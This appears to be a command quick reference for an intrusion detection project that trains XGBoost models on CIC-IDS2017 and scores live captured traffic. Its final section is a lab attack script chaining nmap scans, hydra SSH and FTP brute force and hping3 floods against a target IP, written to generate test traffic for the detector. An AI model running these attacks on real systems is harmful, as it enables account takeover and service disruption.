# Commands Quick Reference

## Environment creation

### Main environment
```powershell
conda create -n spark411 python=3.11 -y
conda activate spark411
pip install pandas numpy scikit-learn xgboost joblib openpyxl
```

### CICFlowMeter environment
```powershell
conda create -n cicflow python=3.12 -y
conda activate cicflow
pip install cicflowmeter==0.4.2
```

### Switch back to main environment
```powershell
conda activate spark411
```

---

## Tool checks

### Check Wireshark dumpcap
```powershell
dumpcap -D
```

### Check WinDump 
```powershell
where.exe tcpdump
where.exe windump
```

### Check CICFlowMeter
```powershell
conda activate cicflow
cicflowmeter -h
conda activate spark411
```

---

## Training commands

### Preprocess CIC-IDS2017
```powershell
python src/prepare_cicids2017.py
```

### Train baseline XGBoost
```powershell
python src/train_baseline_xgb.py
```

### Train stacking ensemble
```powershell
python src/train_stacking_ensemble.py
```

### Export confusion matrices
```powershell
python src/export_confusion_matrices.py
```


---

## Live commands

### One-window live test
```powershell
python src/live_capture_cicflow_xgb_excel.py `
  --interface 5 `
  --dumpcap-exe "C:\Program Files\Wireshark\dumpcap.exe" `
  --cicflowmeter-exe "C:\Users\YOUR_USERNAME\miniconda3\envs\cicflow\Scripts\cicflowmeter.exe" `
  --window-seconds 30 `
  --attack-label "Kali Live Test" `
  --excel outputs\live_attack_results.xlsx `
  --min-attack-flows 1 `
  --max-windows 1
```
### Continuous live monitoring
```powershell
python src/live_capture_cicflow_xgb_excel.py `
  --interface 5 `
  --dumpcap-exe "C:\Program Files\Wireshark\dumpcap.exe" `
  --cicflowmeter-exe "C:\Users\YOUR_USERNAME\miniconda3\envs\cicflow\Scripts\cicflowmeter.exe" `
  --window-seconds 30 `
  --attack-label "Kali Live Test" `
  --excel outputs\live_attack_results.xlsx `
  --min-attack-flows 1
```

---

## Recommended run order from scratch

### Full rebuild
```powershell
conda activate spark411
python src/prepare_cicids2017.py
python src/train_baseline_xgb.py
python src/train_stacking_ensemble.py
python src/export_confusion_matrices.py
python src/predict_xgb_inference.py --input dataset/processed/cicids2017_binary_test.csv --name cic_test_inference
python src/live_capture_cicflow_xgb_excel.py `
  --interface 5 `
  --dumpcap-exe "C:\Program Files\Wireshark\dumpcap.exe" `
  --cicflowmeter-exe "C:\Users\YOUR_USERNAME\miniconda3\envs\cicflow\Scripts\cicflowmeter.exe" `
  --window-seconds 30 `
  --attack-label "Kali Live Test" `
  --excel outputs\live_attack_results.xlsx `
  --min-attack-flows 1
```

### Minimal rebuild
```powershell
conda activate spark411
python src/prepare_cicids2017.py
python src/train_baseline_xgb.py
python src/live_capture_cicflow_xgb_excel.py `
  --interface 5 `
  --dumpcap-exe "C:\Program Files\Wireshark\dumpcap.exe" `
  --cicflowmeter-exe "C:\Users\YOUR_USERNAME\miniconda3\envs\cicflow\Scripts\cicflowmeter.exe" `
  --window-seconds 30 `
  --attack-label "Kali Live Test" `
  --excel outputs\live_attack_results.xlsx `
  --min-attack-flows 1
```

---

## Recommended Kali test scans

Use the host IP as the target.

### Window 1
```bash
nmap -sn <host_ip>
```

### Window 2
```bash
nmap -sS <host_ip>
```

### Window 3
```bash
nmap -Pn -sS -p 1-1000 <host_ip>
```

### Window 4
```bash
nmap -sV <host_ip>
```

### Window 5
```bash
nmap -A <host_ip>
```

Use one scan per 30-second window.


##### Attack Script ######
  #!/bin/bash

  # Configuration
  TARGET_IP="192.168.1.X"  # <--- Change this
  USER_LIST="/usr/share/wordlists/metasploit/common_users.txt"
  PASS_LIST="/usr/share/wordlists/rockyou.txt"

  function next_step() {
      echo -e "\n\e[33m[!] Press [ENTER] to execute the next pattern...\e[0m"
      read
  }

  echo -e "\e[36m--- Starting Lab Attack Sequence ---\e[0m"

  # 1. BENIGN_BASELINE
  echo "Running: BENIGN_BASELINE (Standard Ping)"
  ping -c 4 $TARGET_IP
  next_step

  # 2. NMAP_SYN_SCAN
  echo "Running: NMAP_SYN_SCAN (-sS)"
  sudo nmap -sS $TARGET_IP
  next_step

  # 3. NMAP_FULL_PORT_SCAN
  echo "Running: NMAP_FULL_PORT_SCAN (-p-)"
  sudo nmap -p- $TARGET_IP
  next_step

  # 4. NMAP_SERVICE_SCAN
  echo "Running: NMAP_SERVICE_SCAN (-sV)"
  sudo nmap -sV $TARGET_IP
  next_step

  # 5. NMAP_AGGRESSIVE_SCAN
  echo "Running: NMAP_AGGRESSIVE_SCAN (-A)"
  sudo nmap -A $TARGET_IP
  next_step

  # 6. SSH_BRUTEFORCE_PATTERN
  echo "[+] 6/9: SSH_BRUTEFORCE_PATTERN"
  # Using -l (lowercase L) for a single username "root" to ensure it starts
  # Using -P for the password list
  hydra -l root -P $PASS_LIST ssh://$TARGET_IP -t 4 -vV
  next_phase

  # 7. FTP_BRUTEFORCE_PATTERN
  echo "[+] 7/9: FTP_BRUTEFORCE_PATTERN"
  hydra -l root -P $PASS_LIST ftp://$TARGET_IP -t 4 -vV
  next_phase

  # 8. HTTP_FLOOD_PATTERN
  echo "Running: HTTP_FLOOD (hping3)"
  # Sends a flood of SYN packets to port 80
  sudo hping3 --flood -S -p 80 $TARGET_IP --count 5000
  next_step

  # 9. UDP_FLOOD_PATTERN
  echo "Running: UDP_FLOOD (hping3)"
  sudo hping3 --udp --flood $TARGET_IP --count 5000

  echo -e "\n\e[32m[+] All attack patterns completed.\e[0m"
############



